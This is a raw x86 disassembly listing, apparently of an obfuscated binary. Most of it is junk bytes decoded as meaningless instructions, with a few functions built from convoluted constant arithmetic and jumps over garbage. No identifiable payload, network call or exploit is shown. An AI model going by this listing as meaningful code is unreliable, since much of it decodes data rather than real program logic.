  410ce7:	mov    esp,0x9bc3cb87
  410cec:	mov    dh,BYTE PTR [ebx-0x700befb]
  410cf2:	scas   eax,DWORD PTR es:[edi]
  410cf3:	cmp    edi,edx
  410cf5:	sahf   
  410cf6:	jo     0x410c9a
  410cf8:	sub    DWORD PTR [ebx-0x25],eax
  410cfb:	cld    
  410cfc:	cmc    
  410cfd:	push   eax
  410cfe:	ds mov bh,0xa6
  410d01:	shr    DWORD PTR [ebp+0x660b0e20],1
  410d07:	push   eax
  410d08:	retf   0xf79
  410d0b:	clc    
  410d0c:	sub    edx,DWORD PTR [eax-0x42eee54f]
  410d12:	jge    0x410d93
  410d14:	in     al,dx
  410d15:	adc    DWORD PTR [ecx+0x2a713ef1],0xd28bc242
  410d1f:	jae    0x410caf
  410d21:	pop    es
  410d22:	and    DWORD PTR [edx-0x67],ebx
  410d25:	retf   
  410d26:	aad    0x38
  410d28:	outs   dx,DWORD PTR ds:[esi]
  410d29:	sbb    BYTE PTR [ecx+0x53fa49bb],0x8b
  410d30:	das    
  410d31:	inc    ebx
  410d32:	cmp    esp,DWORD PTR [esi]
  410d34:	add    al,0xc6
  410d36:	mov    al,0xa9
  410d38:	loopne 0x410d2d
  410d3a:	or     ebx,0x47
  410d3d:	adc    eax,DWORD PTR [ebx*2-0x463a5582]
  410d44:	mov    ds:0x945bb03f,eax
  410d49:	cs push esi
  410d4b:	dec    ebx
  410d4c:	dec    eax
  410d4d:	push   ebx
  410d4e:	repz xchg edi,eax
  410d50:	pop    edi
  410d51:	mul    BYTE PTR fs:[edi+0x22]
  410d55:	mov    bl,0xcc
  410d57:	mov    bl,0x59
  410d59:	jne    0x410dd6
  410d5b:	and    DWORD PTR [edi],edi
  410d5d:	daa    
  410d5e:	mov    cl,0x57
  410d60:	sbb    edi,DWORD PTR [eax-0x14f70137]
  410d66:	pusha  
  410d67:	mov    bl,0x78
  410d69:	mov    ebp,0x4df6dd77
  410d6e:	in     al,0xc5
  410d70:	mov    al,0x35
  410d72:	mov    eax,ds:0xe6253325
  410d77:	aad    0xbe
  410d79:	mov    edx,0x3c3961e
  410d7e:	mov    edx,0x715f2580
  410d83:	cmp    esi,edx
  410d85:	mov    ds:0x3f1f90f4,al
  410d8a:	or     al,0x8f
  410d8c:	or     BYTE PTR [edx-0x6f],cl
  410d8f:	or     eax,0xe23428d8
  410d94:	lods   eax,DWORD PTR ds:[esi]
  410d95:	dec    ecx
  410d96:	aad    0x80
  410d98:	or     eax,0x3eff23ee
  410d9d:	shr    ebp,cl
  410d9f:	or     eax,DWORD PTR [ebp-0x51efa2aa]
  410da5:	jnp    0x410e1c
  410da7:	aam    0xeb
  410da9:	push   DWORD PTR [ebx+0x2f4851c5]
  410daf:	xor    eax,0x692db98
  410db4:	cwde   
  410db5:	push   edx
  410db6:	pop    esp
  410db7:	or     bl,BYTE PTR [eax]
  410db9:	cmp    eax,0x6824d073
  410dbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410dbf:	dec    ecx
  410dc0:	jmp    0xac79:0x9234fd8b
  410dc7:	mov    al,0x24
  410dc9:	dec    eax
  410dca:	cld    
  410dcb:	lds    eax,FWORD PTR [edx]
  410dcd:	or     DWORD PTR [esp+esi*4+0x55],esi
  410dd1:	push   0x75911851
  410dd6:	jp     0x410e47
  410dd8:	sbb    edi,0xffffffcd
  410ddb:	iret   
  410ddc:	ja     0x410d92
  410dde:	lds    ebx,FWORD PTR [ecx-0x7c]
  410de1:	jbe    0x410e29
  410de3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410de4:	sbb    eax,0xea4bee82
  410de9:	loope  0x410e04
  410deb:	jmp    0xc2c9:0x5b045089
  410df2:	or     BYTE PTR [eax],al
  410df4:	push   ebp
  410df5:	mov    ebp,esp
  410df7:	sub    esp,0x3c
  410dfa:	mov    DWORD PTR [ebp-0x20],0x3510
  410e01:	mov    DWORD PTR [ebp-0x1c],0x2104
  410e08:	mov    DWORD PTR [ebp-0x18],0x5d15
  410e0f:	mov    DWORD PTR [ebp-0x14],0x30cd
  410e16:	mov    DWORD PTR [ebp-0x10],0x1709
  410e1d:	mov    DWORD PTR [ebp-0xc],0x260b
  410e24:	jmp    0x4110ab
  410e29:	jo     0x410db5
  410e2b:	fldl2e 
  410e2d:	cmp    al,0xb9
  410e2f:	jo     0x410dcd
  410e31:	out    0x46,eax
  410e33:	mov    ah,BYTE PTR [ecx+ecx*8+0x3bcfbd02]
  410e3a:	dec    edx
  410e3b:	mov    esi,0xbec289be
  410e40:	mov    esi,0xc3c6e826
  410e45:	fild   DWORD PTR [ebp+0x455cb676]
  410e4b:	mov    edi,0xd6f9866b
  410e50:	mov    dh,0x27
  410e52:	jge    0x410e16
  410e54:	retf   
  410e55:	jae    0x410e4c
  410e57:	es or  eax,0x2778f36
  410e5d:	fldcw  WORD PTR [esi]
  410e5f:	xor    eax,ecx
  410e61:	sub    ah,BYTE PTR [ebx-0x60]
  410e64:	mov    eax,ds:0x53733d20
  410e69:	addr16 mov edx,0x6a330227
  410e6f:	clc    
  410e70:	gs pop edi
  410e72:	mov    ebp,0xce0eba67
  410e77:	mov    ?,WORD PTR [eax-0x3af761f9]
  410e7d:	pop    edx
  410e7e:	jmp    DWORD PTR [edi]
  410e80:	cld    
  410e81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e82:	and    al,0x98
  410e84:	daa    
  410e85:	bswap  esp
  410e87:	bound  eax,QWORD PTR [esi-0x6ee989b3]
  410e8d:	es sub al,0xa
  410e90:	stc    
  410e91:	pop    ecx
  410e92:	shl    ah,0xd9
  410e95:	dec    ecx
  410e96:	jle    0x410e2e
  410e98:	dec    esi
  410e99:	add    al,0x34
  410e9b:	sub    DWORD PTR [edi],esi
  410e9d:	iret   
  410e9e:	pop    ebx
  410e9f:	sbb    DWORD PTR [esi-0x6d],esp
  410ea2:	(bad)  
  410ea3:	out    dx,al
  410ea4:	stc    
  410ea5:	mov    ecx,0x2cec4a83
  410eaa:	or     ah,bl
  410eac:	neg    DWORD PTR [esi]
  410eae:	fs inc ebx
  410eb0:	and    ch,al
  410eb2:	mov    eax,ds:0x4423a977
  410eb7:	(bad)  
  410eb8:	adc    ch,ah
  410eba:	ret    
  410ebb:	ss push es
  410ebd:	mov    WORD PTR [edi],cs
  410ebf:	fnstsw WORD PTR [eax+0x535f315f]
  410ec5:	ret    0x5f6b
  410ec8:	cmp    eax,0x27f4afe
  410ecd:	inc    edx
  410ece:	fimul  DWORD PTR [ecx-0x6401ef2a]
  410ed4:	mov    gs,WORD PTR [edx-0x3]
  410ed7:	sbb    DWORD PTR [eax+0x31],ebp
  410eda:	xchg   edx,ebp
  410edc:	mov    al,ds:0x70b55c0e
  410ee1:	sub    esp,DWORD PTR [esp+ecx*2-0x2c]
  410ee5:	jle    0x410ee2
  410ee7:	pop    ds
  410ee8:	cmp    DWORD PTR ds:0xbb72cfbd,edi
  410eee:	outs   dx,BYTE PTR ds:[esi]
  410eef:	inc    ebx
  410ef0:	into   
  410ef1:	pop    ebx
  410ef2:	jmp    0x18b638b3
  410ef7:	je     0x410f6e
  410ef9:	in     al,0xe5
  410efb:	or     eax,0x43e566c
  410f00:	lods   al,BYTE PTR ds:[esi]
  410f01:	add    DWORD PTR ds:0x74d136c6,esp
  410f07:	xchg   edx,eax
  410f08:	gs call 0xa9e8:0xb1950f97
  410f10:	push   esp
  410f11:	cmc    
  410f12:	or     al,0x91
  410f14:	dec    esp
  410f15:	iret   
  410f16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f17:	shr    ch,cl
  410f19:	hlt    
  410f1a:	pusha  
  410f1b:	int3   
  410f1c:	fnstenv ds:0x207b112e
  410f22:	inc    ebx
  410f23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f24:	or     bh,0x15
  410f27:	ficomp DWORD PTR [edi+0x28]
  410f2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f2b:	jb     0x410ef2
  410f2d:	stos   DWORD PTR es:[edi],eax
  410f2e:	adc    eax,0x3eb898d3
  410f33:	int    0xf6
  410f35:	out    dx,al
  410f36:	fwait
  410f37:	imul   eax,edx,0xffffffb3
  410f3a:	icebp  
  410f3b:	stos   BYTE PTR es:[edi],al
  410f3c:	push   ss
  410f3d:	inc    ecx
  410f3e:	mov    cs,WORD PTR [esi-0x4843f865]
  410f44:	les    esp,FWORD PTR [ecx+eax*2]
  410f47:	int3   
  410f48:	enter  0xc3d6,0xf
  410f4c:	out    0xeb,al
  410f4e:	push   ss
  410f4f:	add    eax,0xb4d96782
  410f54:	lea    esp,[edi]
  410f56:	dec    ebp
  410f57:	les    ebx,FWORD PTR [edi+0x15f2ec81]
  410f5d:	xor    DWORD PTR [edx-0x8],eax
  410f60:	cmp    DWORD PTR [ebx-0x4b630a4],edx
  410f66:	inc    esp
  410f67:	aaa    
  410f68:	and    BYTE PTR [eax],0x9
  410f6b:	and    bh,BYTE PTR [ebx]
  410f6d:	sub    BYTE PTR [ebx],0x7b
  410f70:	mov    edi,0x495ba7a2
  410f75:	push   ebp
  410f76:	and    eax,0xf15f75db
  410f7b:	sbb    BYTE PTR ds:0x10088186,bh
  410f81:	out    dx,eax
  410f82:	aas    
  410f83:	xchg   ebx,eax
  410f84:	cld    
  410f85:	inc    edi
  410f86:	adc    ecx,DWORD PTR [edx]
  410f88:	repz rcl BYTE PTR [eax-0x50ca27be],cl
  410f8f:	fmul   DWORD PTR [ebx+0x3270f2a1]
  410f95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f96:	or     eax,0xe8dc346a
  410f9b:	test   eax,0xca99ee6a
  410fa0:	cwde   
  410fa1:	push   esp
  410fa2:	xchg   edx,eax
  410fa3:	loopne 0x410f4d
  410fa5:	push   ebp
  410fa6:	cmp    al,0xe7
  410fa8:	adc    DWORD PTR [esi-0x38],esp
  410fab:	(bad)  
  410fac:	inc    DWORD PTR [eax+ebp*2]
  410faf:	ror    BYTE PTR [edx],cl
  410fb1:	fs cmps DWORD PTR gs:[esi],DWORD PTR es:[edi]
  410fb4:	popf   
  410fb5:	sub    al,0x4e
  410fb7:	and    eax,0xd083f9ef
  410fbc:	mov    ds:0xf6dac327,al
  410fc1:	cdq    
  410fc2:	(bad)  
  410fc3:	in     eax,dx
  410fc4:	popa   
  410fc5:	and    dh,BYTE PTR [esi-0x3f02d96c]
  410fcb:	cs int 0x12
  410fce:	retf   0x2d5
  410fd1:	push   esp
  410fd2:	xchg   esi,eax
  410fd3:	cmc    
  410fd4:	jb     0x410f8e
  410fd6:	lahf   
  410fd7:	aaa    
  410fd8:	adc    al,0xe0
  410fda:	and    al,0xe3
  410fdc:	mov    ebx,0xdf1e4a8a
  410fe1:	rol    DWORD PTR [eax+0x1f],cl
  410fe4:	dec    ecx
  410fe5:	stos   BYTE PTR es:[edi],al
  410fe6:	(bad)  
  410fe7:	je     0x410fbe
  410fe9:	repz xchg edi,eax
  410feb:	xchg   esp,eax
  410fec:	(bad)
  410ff1:	or     eax,0x8434e7f4
  410ff6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ff7:	jmp    0x8b3e:0x3d9505bf
  410ffe:	ds dec eax
  411000:	xchg   edi,eax
  411001:	fiadd  DWORD PTR [edx+0x6680e5b7]
  411007:	mov    esi,esi
  411009:	pop    ds
  41100a:	imul   esi,ebp,0xb05a4d30
  411010:	adc    ebp,ebx
  411012:	inc    ecx
  411013:	jo     0x411036
  411015:	dec    BYTE PTR [ecx-0x2f]
  411018:	shr    DWORD PTR [edx-0x36],1
  41101b:	ffreep st(1)
  41101d:	and    ah,ah
  41101f:	xchg   esp,eax
  411020:	mov    edx,0xad82414f
  411025:	(bad)  
  411026:	(bad)  
  411027:	(bad)  
  411028:	xor    eax,0x3336a0c9
  41102d:	jp     0x411040
  41102f:	inc    edx
  411030:	mov    bl,0xd9
  411033:	es xchg ebp,eax
  411035:	sub    cl,al
  411037:	repnz cmp ebp,DWORD PTR [esi]
  41103a:	repnz into 
  41103c:	test   al,0xc2
  41103e:	lds    ebp,FWORD PTR [ebp-0xa]
  411041:	(bad)  
  411042:	pop    eax
  411043:	push   ebp
  411044:	jae    0x410fe6
  411046:	cli    
  411047:	or     DWORD PTR [esi+0x9fcca2a],ebp
  41104d:	inc    esi
  41104e:	jmp    0x75b3:0x1276846
  411055:	xchg   ecx,eax
  411056:	ror    DWORD PTR [esi],cl
  411058:	ret    
  411059:	cmp    dh,BYTE PTR [esi]
  41105b:	jb     0x411094
  41105d:	mov    ah,0xd6
  41105f:	pop    ebx
  411060:	push   0x88593a69
  411065:	push   0xbbca29cf
  41106a:	ja     0x411056
  41106c:	mov    eax,0x55d6eef3
  411071:	fcom   DWORD PTR [edi]
  411073:	fsubr  DWORD PTR ds:0x4e218977
  411079:	push   esi
  41107a:	inc    esi
  41107b:	pop    ds
  41107c:	cld    
  41107d:	cmp    DWORD PTR [edi],ebx
  41107f:	mov    esp,0xd5c2d668
  411084:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411085:	int    0xb2
  411087:	xor    bl,BYTE PTR [ebx+edi*2+0x7f]
  41108b:	xor    BYTE PTR [ecx],cl
  41108d:	jmp    0x40011ca2
  411092:	cmp    BYTE PTR [ecx+edx*4+0x36],al
  411096:	push   edi
  411097:	xor    cl,BYTE PTR [edx+0x6ba1efdd]
  41109d:	mov    eax,0x1b128289
  4110a2:	cli    
  4110a3:	or     eax,0x735be579
  4110a8:	cmp    al,0x9b
  4110aa:	inc    esi
  4110ab:	mov    DWORD PTR [ebp-0x8],0x3204
  4110b2:	mov    DWORD PTR [ebp-0x4],0x62ea
  4110b9:	mov    DWORD PTR [ebp-0x38],0x58e9
  4110c0:	jmp    0x411347
  4110c5:	pop    edx
  4110c6:	daa    
  4110c7:	fcomp  QWORD PTR [eax-0x44]
  4110ca:	mov    esp,0xf3ba2b5a
  4110cf:	aad    0xe3
  4110d1:	cmp    DWORD PTR [edi-0x66],0xffffffe3
  4110d5:	or     BYTE PTR [esi-0x42],cl
  4110d8:	mov    esi,0xbebec289
  4110dd:	std    
  4110de:	icebp  
  4110df:	cmp    al,0x92
  4110e1:	xor    DWORD PTR [ecx],0x5
  4110e4:	les    esp,FWORD PTR [eax-0x6b3771d7]
  4110ea:	xor    DWORD PTR [eax+0x2a],ecx
  4110ed:	ss mov edx,edi
  4110f0:	fsubr  DWORD PTR ds:0x76e59b2a
  4110f6:	cdq    
  4110f7:	push   eax
  4110f8:	xor    dh,bl
  4110fa:	fdivr  QWORD PTR [edx-0x15]
  4110fd:	addr16 jbe 0x41113b
  411100:	imul   eax,DWORD PTR [ebp+0x3b5e9817],0x64
  411107:	lods   al,BYTE PTR ds:[esi]
  411108:	fst    DWORD PTR [ecx+0x469e3fb7]
  41110e:	nop
  41110f:	or     al,0xf
  411111:	or     al,0xc7
  411113:	fstp   QWORD PTR [edx-0x79bf1964]
  411119:	inc    ebx
  41111a:	call   0xdd47:0xee2abc99
  411121:	call   0x1566323e
  411126:	fisub  DWORD PTR [edi-0x6c]
  411129:	in     al,dx
  41112a:	mov    al,ds:0x4b99afa8
  41112f:	scas   eax,DWORD PTR es:[edi]
  411130:	adc    ch,BYTE PTR [edx+esi*8]
  411133:	loope  0x4110c3
  411135:	and    dl,BYTE PTR [edi+0x77880307]
  41113b:	xchg   DWORD PTR [edi],edx
  41113d:	jle    0x411103
  41113f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411140:	leave  
  411141:	mov    DWORD PTR [ebx-0x3dd1b2ec],eax
  411147:	adc    eax,0xdbb36883
  41114c:	fwait
  41114d:	push   edi
  41114e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41114f:	push   edx
  411150:	je     0x411151
  411152:	shr    BYTE PTR [esi],cl
  411154:	or     DWORD PTR [ecx+0x7f],eax
  411157:	inc    ecx
  411158:	test   al,0x8b
  41115a:	icebp  
  41115b:	inc    esi
  41115c:	and    bl,BYTE PTR [ebp-0x20]
  41115f:	mov    eax,ds:0xfb885d5e
  411164:	mov    DWORD PTR [esp+ecx*2],edx
  411167:	push   eax
  411168:	shr    BYTE PTR [ebp+0xb3c8d72],0x8
  41116f:	push   0x31
  411171:	mov    eax,0x3f83489a
  411176:	mov    esi,0x6015410
  41117b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41117c:	dec    ebx
  41117d:	xlat   BYTE PTR ds:[ebx]
  41117e:	sub    BYTE PTR [eax+0x67],cl
  411181:	ins    DWORD PTR es:[edi],dx
  411182:	add    DWORD PTR [ecx+0x56],0x33
  411186:	cmp    eax,0x9e085cc8
  41118b:	mov    ecx,0x4b2dff44
  411190:	(bad)  
  411191:	push   edi
  411192:	arpl   WORD PTR [edx],dx
  411194:	sar    DWORD PTR [edi+0x3d51f69],cl
  41119a:	push   ds
  41119b:	xchg   cl,bh
  41119d:	cmp    al,0x29
  41119f:	mov    edi,0xcd8ba62e
  4111a4:	push   cs
  4111a5:	out    dx,eax
  4111a6:	frstor [edi]
  4111a8:	xor    ch,al
  4111aa:	cmp    al,0x3
  4111ac:	adc    BYTE PTR [ecx],bh
  4111ae:	test   BYTE PTR [edi+0x4c],0x17
  4111b2:	sub    bh,dl
  4111b4:	xor    edi,esi
  4111b6:	pop    edx
  4111b7:	retf   
  4111b8:	or     ch,BYTE PTR [eax+0x4d]
  4111bb:	jge    0x4111f3
  4111bd:	xor    BYTE PTR [ebp-0x3],0xd7
  4111c1:	mov    cl,0xe7
  4111c3:	jmp    0x16e0:0x6c676a9e
  4111ca:	pop    ebp
  4111cb:	mov    ds:0xc9ac2ef0,al
  4111d0:	mov    bh,0xa3
  4111d2:	dec    cl
  4111d4:	xlat   BYTE PTR ds:[ebx]
  4111d5:	scas   al,BYTE PTR es:[edi]
  4111d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111d7:	mov    al,0x9b
  4111d9:	adc    cl,0x25
  4111dc:	add    BYTE PTR [ebx-0x6e],ah
  4111df:	adc    BYTE PTR [ebp+0x5c94ddc3],dl
  4111e5:	mov    edi,0x825c6bf6
  4111ea:	or     eax,0xc7330d46
  4111ef:	inc    esi
  4111f0:	sbb    esp,DWORD PTR [eax]
  4111f2:	test   eax,0x991ab2fe
  4111f7:	cmc    
  4111f8:	mov    edx,DWORD PTR [ecx-0x5f729acd]
  4111fe:	stos   DWORD PTR es:[edi],eax
  4111ff:	inc    eax
  411200:	xchg   esi,eax
  411201:	xor    edx,eax
  411203:	push   esi
  411204:	pop    edx
  411205:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411206:	sar    BYTE PTR [edi-0x42],1
  411209:	or     DWORD PTR [edi],esp
  41120b:	mov    esi,0xdb62a0d9
  411210:	jo     0x41128d
  411212:	loope  0x411230
  411214:	pop    esi
  411215:	in     eax,dx
  411216:	pop    ebx
  411217:	outs   dx,BYTE PTR gs:[esi]
  411219:	inc    esp
  41121a:	pop    ebx
  41121b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41121c:	not    BYTE PTR [edi]
  41121e:	or     esp,DWORD PTR [ebp+0x24]
  411221:	add    dl,BYTE PTR [edi+ecx*4]
  411224:	sti    
  411225:	mov    dl,0x1a
  411227:	pop    edx
  411229:	xchg   ebx,eax
  41122a:	outs   dx,BYTE PTR ds:[esi]
  41122b:	xchg   DWORD PTR [esi-0x15],ecx
  41122e:	icebp  
  41122f:	xor    eax,0x13965f24
  411234:	fidiv  DWORD PTR [eax+0x13]
  411237:	call   0xd04eaf1c
  41123c:	or     eax,0xb0aecf2
  411241:	out    dx,eax
  411242:	stos   DWORD PTR es:[edi],eax
  411243:	adc    BYTE PTR [esi],ah
  411245:	imul   BYTE PTR [ecx+0x61]
  411248:	stos   BYTE PTR es:[edi],al
  411249:	scas   al,BYTE PTR es:[edi]
  41124a:	scas   al,BYTE PTR es:[edi]
  41124b:	or     ebx,DWORD PTR [esi+0x6a]
  41124e:	stos   DWORD PTR es:[edi],eax
  41124f:	rcr    BYTE PTR [ecx],cl
  411251:	test   DWORD PTR [esi],esi
  411253:	fidivr WORD PTR [ebx+0x5429fab1]
  411259:	sub    DWORD PTR [ecx+0x30],edi
  41125c:	cmp    dl,bl
  41125e:	mov    ecx,0x6182a653
  411263:	cld    
  411264:	add    al,0x5
  411266:	mov    bl,0xe4
  411268:	pop    esp
  411269:	and    BYTE PTR [ebx+0x3d],al
  41126c:	cmp    DWORD PTR [ebx],eax
  41126e:	fs and bh,bh
  411271:	cli    
  411272:	mov    bh,0x2a
  411274:	mov    eax,0x3ca26135
  411279:	jge    0x41125d
  41127b:	pop    ebp
  41127c:	aas    
  41127d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41127e:	and    eax,0x16c881e5
  411283:	jge    0x4112c8
  411285:	aam    0x6d
  411287:	rol    DWORD PTR [ecx],cl
  411289:	repnz int 0x3f
  41128c:	les    cx,DWORD PTR [esi+0x3a]
  411290:	out    dx,al
  411291:	jge    0x41125f
  411293:	mov    edx,0x6cf7b0c7
  411298:	in     eax,0xb2
  41129a:	xor    eax,0x891c0aac
  41129f:	test   ebx,ebp
  4112a1:	in     al,dx
  4112a2:	sbb    DWORD PTR ss:[ecx],ebp
  4112a5:	jnp    0x41125c
  4112a7:	or     dh,cl
  4112a9:	lahf   
  4112aa:	pusha  
  4112ab:	push   esp
  4112ac:	sub    al,0xb8
  4112ae:	push   ss
  4112af:	cmc    
  4112b0:	test   eax,0x393a839a
  4112b5:	fidivr DWORD PTR [ebp-0x5c]
  4112b8:	pop    ss
  4112b9:	mov    eax,ds:0x66999579
  4112be:	or     eax,DWORD PTR [ecx]
  4112c0:	stos   DWORD PTR es:[edi],eax
  4112c1:	jmp    0x411341
  4112c3:	cwde   
  4112c4:	in     eax,0xb4
  4112c6:	les    edi,FWORD PTR [edx-0x500db54]
  4112cc:	out    0xaf,eax
  4112ce:	sbb    eax,0x3193fbc0
  4112d3:	pop    es
  4112d4:	mov    ebp,edi
  4112d6:	dec    esi
  4112d7:	into   
  4112d8:	inc    eax
  4112d9:	iret   
  4112da:	ss in  al,dx
  4112dc:	xchg   ebp,eax
  4112dd:	pop    esi
  4112de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4112df:	out    0x11,al
  4112e1:	std    
  4112e2:	cmp    edx,DWORD PTR [edi+ecx*2+0x6e4b894b]
  4112e9:	inc    edx
  4112ea:	out    0xca,eax
  4112ec:	fwait
  4112ed:	js     0x41134a
  4112ef:	aad    0xfd
  4112f1:	push   ebx
  4112f2:	hlt    
  4112f3:	cld    
  4112f4:	or     BYTE PTR [ecx-0x26],0x67
  4112f8:	adc    DWORD PTR [ecx+eax*2-0x35758516],edx
  4112ff:	or     bh,BYTE PTR ds:0xe1f4d1df
  411305:	xlat   BYTE PTR ds:[ebx]
  411306:	xchg   ecx,eax
  411307:	xor    DWORD PTR [ecx-0x54],0x61
  41130b:	jmp    0x5455:0xde824b22
  411312:	in     al,0x56
  411314:	or     al,0x3e
  411316:	pop    ebp
  411317:	dec    esi
  411318:	out    dx,al
  411319:	fild   QWORD PTR [ebp+0x6b0fa9b1]
  41131f:	aam    0x56
  411321:	lds    esi,FWORD PTR [ebx+0x40]
  411324:	dec    edx
  411325:	bound  eax,QWORD PTR [edi-0x3f120fd9]
  41132b:	mov    esi,0xa2506042
  411330:	(bad)
  411333:	popf   
  411334:	adc    BYTE PTR ds:0x2254ea30,ah
  41133a:	mov    bh,0x6f
  41133c:	es jns 0x4112f1
  41133f:	dec    eax
  411340:	mov    DWORD PTR [ecx+0x5934622e],esp
  411346:	sbb    al,0xc7
  411348:	inc    ebp
  411349:	int3   
  41134a:	mov    DWORD PTR [edi+0x0],edi
  41134d:	add    bh,al
  41134f:	inc    ebp
  411350:	rcr    dl,1
  411352:	jg     0x411354
  411354:	add    bh,al
  411356:	inc    ebp
  411357:	aam    0x89
  411359:	sub    BYTE PTR [eax],al
  41135b:	add    bh,al
  41135d:	inc    ebp
  41135e:	fmul   DWORD PTR [edi]
  411360:	sldt   WORD PTR [eax]
  411363:	mov    DWORD PTR [ebp-0x24],0x58e1
  41136a:	mov    DWORD PTR [ebp-0x3c],0x69c
  411371:	mov    eax,DWORD PTR [ebp-0x10]
  411374:	mov    ecx,DWORD PTR [ebp-0x14]
  411377:	and    al,0xb9
  411379:	add    al,cl
  41137b:	mov    ecx,DWORD PTR [ebp-0x18]
  41137e:	and    al,cl
  411380:	mov    ecx,DWORD PTR [ebp-0x1c]
  411383:	sub    al,0x11
  411385:	and    al,cl
  411387:	mov    ecx,DWORD PTR [ebp-0x20]
  41138a:	mov    edx,DWORD PTR [ebp+0x8]
  41138d:	imul   ecx,ecx,0x6008
  411393:	add    ecx,0x1759dd6e
  411399:	add    al,0x4d
  41139b:	xor    ecx,0x2b4185ee
  4113a1:	cmp    BYTE PTR [ecx+edx*1],al
  4113a4:	jne    0x41143e
  4113aa:	mov    ecx,DWORD PTR [ebp-0x4]
  4113ad:	mov    eax,0xffffeff8
  4113b2:	mov    edx,eax
  4113b4:	sub    edx,ecx
  4113b6:	add    edx,DWORD PTR [ebp-0x8]
  4113b9:	mov    ecx,DWORD PTR [ebp-0xc]
  4113bc:	or     edx,ecx
  4113be:	mov    ecx,DWORD PTR [ebp-0x4]
  4113c1:	imul   edx,edx,0x85300
  4113c7:	sub    eax,ecx
  4113c9:	add    eax,DWORD PTR [ebp-0x8]
  4113cc:	mov    ecx,DWORD PTR [ebp-0xc]
  4113cf:	or     eax,ecx
  4113d1:	mov    ecx,DWORD PTR [ebp+0x8]
  4113d4:	mov    ecx,DWORD PTR [edx+ecx*1+0x1c323f3c]
  4113db:	add    eax,0x40e5
  4113e0:	imul   eax,eax,0x214c
  4113e6:	add    eax,ecx
  4113e8:	mov    ecx,DWORD PTR [ebp+0x8]
  4113eb:	add    ecx,eax
  4113ed:	mov    DWORD PTR [ebp+0x8],ecx
  4113f0:	mov    eax,DWORD PTR [ebp-0x24]
  4113f3:	mov    ecx,DWORD PTR [ebp-0x28]
  4113f6:	and    eax,ecx
  4113f8:	mov    ecx,DWORD PTR [ebp-0x2c]
  4113fb:	and    eax,ecx
  4113fd:	mov    ecx,DWORD PTR [ebp-0x30]
  411400:	imul   eax,ecx
  411403:	mov    ecx,DWORD PTR [ebp-0x34]
  411406:	or     eax,ecx
  411408:	mov    ecx,DWORD PTR [ebp-0x38]
  41140b:	imul   eax,ecx
  41140e:	mov    ecx,DWORD PTR [ebp+0x8]
  411411:	sub    eax,0x777ea653
  411416:	cmp    DWORD PTR [ecx+0x54],eax
  411419:	je     0x411427
  41141f:	mov    eax,DWORD PTR [ebp+0x8]
  411422:	jmp    0x41146e
  411427:	mov    eax,DWORD PTR [ebp-0x3c]
  41142a:	sub    eax,0x5258
  41142f:	xor    eax,0x49e9
  411434:	add    eax,0x253
  411439:	jmp    0x41146e
  41143e:	mov    DWORD PTR [ebp-0x3c],0x4177
  411445:	mov    DWORD PTR [ebp+0x8],0x1405
  41144c:	mov    eax,DWORD PTR [ebp+0x8]
  41144f:	mov    ecx,DWORD PTR [ebp-0x3c]
  411452:	imul   eax,eax,0x58cc
  411458:	add    eax,0x3f39
  41145d:	and    eax,ecx
  41145f:	add    eax,0x3b90
  411464:	or     eax,0x4b1c
  411469:	sub    eax,0x7fdd
  41146e:	leave  
  41146f:	ret    0x4
  411472:	push   ebp
  411473:	mov    ebp,esp
  411475:	and    esp,0xfffffff8
  411478:	sub    esp,0x20
  41147b:	push   ebx
  41147c:	push   esi
  41147d:	lea    eax,[esp+0x10]
  411481:	mov    DWORD PTR [esp+0xc],eax
  411485:	mov    eax,DWORD PTR [esp+0xc]
  411489:	mov    ecx,DWORD PTR [esp+0x10]
  41148d:	mov    edx,DWORD PTR [esp+0x14]
  411491:	sub    DWORD PTR [eax],ecx
  411493:	sbb    DWORD PTR [eax+0x4],edx
  411496:	mov    eax,DWORD PTR [esp+0xc]
  41149a:	or     DWORD PTR [eax],0xcb7db576
  4114a0:	or     DWORD PTR [eax+0x4],0x9c2b8ae8
  4114a7:	lea    eax,[esp+0x18]
  4114ab:	jmp    0x41183a
  4114b0:	test   al,0x7c
  4114b2:	or     BYTE PTR [esp+ebx*1-0x44],ch
  4114b6:	lods   al,BYTE PTR ds:[esi]
  4114b7:	mov    esp,0x92465201
  4114bc:	test   eax,0xd49e5ea8
  4114c1:	push   esp
  4114c2:	mov    esi,0xbec499be
  4114c7:	mov    esi,0x894751a7
  4114cc:	scas   al,BYTE PTR es:[edi]
  4114cd:	sbb    BYTE PTR [ebx-0x3b57f254],al
  4114d3:	stos   BYTE PTR es:[edi],al
  4114d4:	mov    bh,0x1f
  4114d6:	jne    0x411511
  4114d8:	aas    
  4114d9:	shl    BYTE PTR [esi],0x64
  4114dc:	(bad)  
  4114dd:	cmp    esi,ebx
  4114df:	data16 fistp QWORD PTR [edx-0x26]
  4114e3:	frstor [edx+0x47]
  4114e6:	sub    ebx,DWORD PTR [ebp+0xd]
  4114e9:	cmp    al,BYTE PTR cs:[edi]
  4114ec:	jbe    0x411540
  4114ee:	into   
  4114ef:	push   ebp
  4114f0:	(bad)  
  4114f1:	fstp   DWORD PTR [ebx-0x63]
  4114f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4114f6:	popf   
  4114f7:	mov    ebp,0xbc4af6aa
  4114fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114fd:	repz jo 0x411544
  411500:	pop    ds
  411501:	ret    0x4791
  411504:	push   0xfffffff0
  411506:	dec    ebx
  411507:	inc    esi
  411508:	mov    bh,0xab
